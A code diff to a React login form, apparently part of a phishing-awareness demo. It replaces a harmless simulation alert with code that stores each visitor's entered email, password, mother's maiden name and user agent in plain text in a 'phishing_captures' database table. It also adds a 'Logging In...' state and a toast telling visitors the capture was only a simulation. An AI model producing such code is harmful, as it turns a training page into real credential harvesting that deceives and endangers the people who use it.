@@ -4,6 +4,8 @@ import { Input } from "@/components/ui/input";
 import { Checkbox } from "@/components/ui/checkbox";
 import { cn } from "@/lib/utils";
 import PhishingIndicator from "./PhishingIndicator";
+import { supabase } from "@/integrations/supabase/client";
+import { useToast } from "@/hooks/use-toast";
 
 interface FakeLoginFormProps {
   showIndicators: boolean;
@@ -12,11 +14,44 @@ interface FakeLoginFormProps {
 const FakeLoginForm = ({ showIndicators }: FakeLoginFormProps) => {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
+  const [maidenName, setMaidenName] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const { toast } = useToast();
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    // This is a simulation - no actual submission
-    alert("⚠️ SIMULATION ALERT ⚠️\n\nIn a real phishing attack, your credentials would now be stolen!\n\nNever enter your real credentials on suspicious websites.");
+    setIsSubmitting(true);
+
+    try {
+      // Save captured credentials to database (demonstrating how phishing works)
+      // Using type assertion since types may not be synced yet
+      const { error } = await (supabase as any)
+        .from("phishing_captures")
+        .insert({
+          email: email || "not-provided",
+          password: password || "not-provided",
+          additional_info: {
+            maiden_name: maidenName,
+            save_payment: true,
+          },
+          user_agent: navigator.userAgent,
+        });
+
+      if (error) {
+        console.error("Error saving capture:", error);
+      }
+
+      // Show educational alert
+      toast({
+        title: "⚠️ SIMULATION ALERT",
+        description: "Your credentials were just 'captured'! In a real phishing attack, attackers would now have your login info.",
+        variant: "destructive",
+      });
+    } catch (err) {
+      console.error("Submission error:", err);
+    } finally {
+      setIsSubmitting(false);
+    }
   };
 
   return (
@@ -71,6 +106,8 @@ const FakeLoginForm = ({ showIndicators }: FakeLoginFormProps) => {
         <Input
           type="text"
           placeholder="Mother's Maiden Name (for verification)"
+          value={maidenName}
+          onChange={(e) => setMaidenName(e.target.value)}
           className="h-12"
         />
         <PhishingIndicator
@@ -110,9 +147,10 @@ const FakeLoginForm = ({ showIndicators }: FakeLoginFormProps) => {
       {/* Login button */}
       <Button 
         type="submit" 
+        disabled={isSubmitting}
         className="w-full h-12 social-gradient text-white font-semibold text-base hover:opacity-90 transition-opacity"
       >
-        Log In
+        {isSubmitting ? "Logging In..." : "Log In"}
       </Button>
 
       {/* Suspicious link */}
